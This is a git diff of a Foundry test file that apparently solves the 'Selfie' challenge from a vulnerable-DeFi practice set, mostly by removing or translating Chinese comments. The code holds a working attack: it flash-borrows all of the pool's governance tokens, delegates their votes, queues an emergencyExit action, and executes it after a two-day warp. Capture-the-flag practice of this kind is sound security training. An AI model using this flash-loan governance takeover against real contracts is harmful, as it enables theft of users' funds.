@@ -8,9 +8,6 @@ import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-/**
- * CODE YOUR SOLUTION HERE
- */
 contract SelfieAttacker is IERC3156FlashBorrower {
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
     
@@ -37,7 +34,7 @@ contract SelfieAttacker is IERC3156FlashBorrower {
     }
     
     function attack() external {
-        // 借用池子中的所有代币
+        // FlashLoan all the tokens
         uint256 amount = pool.maxFlashLoan(address(token));
         pool.flashLoan(this, address(token), amount, "");
     }
@@ -49,24 +46,21 @@ contract SelfieAttacker is IERC3156FlashBorrower {
         uint256,
         bytes calldata
     ) external returns (bytes32) {
-        // 使用投票权创建提案
-        // 关键修改：先委托投票权给自己
+
         token.delegate(address(this));
-        
-        // 创建调用emergencyExit的提案（注意：这里改为emergencyExit，而不是drainAllFunds）
+
         bytes memory data = abi.encodeWithSignature(
             "emergencyExit(address)",
             recovery
         );
         
-        // 提交治理提案
         actionId = governance.queueAction(
             address(pool),
             0,
             data
         );
         
-        // 批准归还闪电贷
+        // repay flashLoan
         token.approve(address(pool), amount);
         
         return CALLBACK_SUCCESS;
@@ -128,11 +122,7 @@ contract SelfieChallenge is Test {
         assertEq(pool.flashFee(address(token), 0), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
     function test_selfie() public checkSolvedByPlayer {
-        // 部署攻击合约
         SelfieAttacker attacker = new SelfieAttacker(
             pool,
             governance,
@@ -141,13 +131,10 @@ contract SelfieChallenge is Test {
             recovery
         );
         
-        // 执行闪电贷攻击，提交治理提案
         attacker.attack();
-        
-        // 快进 2 天
+
         vm.warp(block.timestamp + 2 days);
         
-        // 执行治理提案，提取所有资金
         attacker.executeProposal();
     }
 
